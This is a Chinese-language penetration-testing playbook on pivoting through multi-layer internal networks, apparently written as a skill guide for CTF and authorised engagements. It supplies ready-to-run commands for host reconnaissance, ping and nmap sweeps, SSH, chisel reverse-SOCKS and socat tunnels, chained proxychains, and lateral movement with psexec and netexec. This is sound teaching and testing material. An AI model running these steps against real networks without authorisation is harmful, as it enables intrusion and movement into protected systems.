# 多层内网穿透 (Multi-Layer Network Pivoting)

## 概述
在渗透测试中，目标往往处于多层隔离网络中。攻击者需要通过已控制的跳板机建立隧道链，逐层穿透到核心网络。

## 适用场景
- CTF 比赛中的多层靶机拓扑
- 企业渗透中的 DMZ → 内网 → 核心区
- 双网卡主机作为跳板

## 前置条件
- 已获得至少一台入口机的命令执行权限（RCE/Shell/WebShell）
- 已知或可探测内网网段

---

## 流程

### Step 1：入口机信息收集
```bash
# 查看入口机网卡信息，发现内网网段
ip addr show
ifconfig -a
cat /etc/hosts
arp -a
route -n
```
**关键输出**：识别出入口机连接的所有网段（如 `10.0.0.0/24` + `172.16.0.0/24`）。

### Step 2：内网存活探测
```bash
# 快速 ping 扫描（从入口机执行）
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.0.$i &>/dev/null && echo "172.16.0.$i alive"; done

# 或使用 nmap（如果入口机有 nmap）
nmap -sn 172.16.0.0/24
```

### Step 3：建立隧道

#### 方案 A：SSH 动态端口转发（最简单）
```bash
# 在沙箱执行，将入口机作为 SOCKS 代理
ssh -D 1080 -N -f user@<入口机IP>

# 配置 proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 通过代理扫描第二层
proxychains4 nmap -sT -Pn -p 22,80,445,3389,3306 172.16.0.0/24
```

#### 方案 B：chisel 反向 SOCKS 代理
```bash
# 沙箱端：启动 chisel server
chisel server --reverse --port 9999

# 入口机端：连接回来，开启反向 SOCKS
./chisel client <沙箱IP>:9999 R:socks

# 沙箱端：proxychains 使用 1080 端口（chisel 默认）
proxychains4 nmap -sT -Pn 172.16.0.0/24
```

#### 方案 C：socat 端口映射（访问特定服务）
```bash
# 入口机上：将内网 MySQL 映射到入口机端口
socat TCP-LISTEN:33306,fork TCP:172.16.0.5:3306 &

# 沙箱端：直接连接入口机的映射端口
mysql -h <入口机IP> -P 33306 -u root -p
```

### Step 4：多层串联（三层及以上）

```
沙箱 ←SSH/chisel→ 入口机(10.0.0.5) ←SSH/chisel→ 内网机1(172.16.0.5) ←SSH→ 核心区(192.168.1.x)
     SOCKS:1080                      SOCKS:1081                        直连
```

**proxychains 配置（strict_chain 模式）**：
```
# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

### Step 5：各层服务利用
```bash
# 通过多层代理访问核心区服务
proxychains4 curl http://192.168.1.10/
proxychains4 impacket-psexec corp.local/admin:pass@192.168.1.10
proxychains4 netexec smb 192.168.1.0/24 -u admin -p pass
```

---

## 工具速查

| 工具 | 命令模板 | 说明 |
|------|---------|------|
| SSH -D | `ssh -D <port> -N -f user@host` | SOCKS5 动态转发 |
| SSH -L | `ssh -L <lport>:<rhost>:<rport> user@host` | 本地端口映射 |
| SSH -R | `ssh -R <rport>:<lhost>:<lport> user@host` | 反向端口映射 |
| chisel server | `chisel server --reverse --port 9999` | 沙箱端启动 |
| chisel client | `chisel client <server>:9999 R:socks` | 目标端反向连接 |
| socat | `socat TCP-LISTEN:<lport>,fork TCP:<rhost>:<rport>` | TCP 端口转发 |
| proxychains | `proxychains4 <command>` | 代理链执行命令 |

## 注意事项
- 始终使用 `nmap -sT`（TCP connect），SOCKS 代理不支持 SYN 扫描
- proxychains 不支持 UDP 和 ICMP，ping 扫描无效
- 每建立一跳后立即验证连通性
- 记录每跳的 IP、端口、凭据，写入 topology
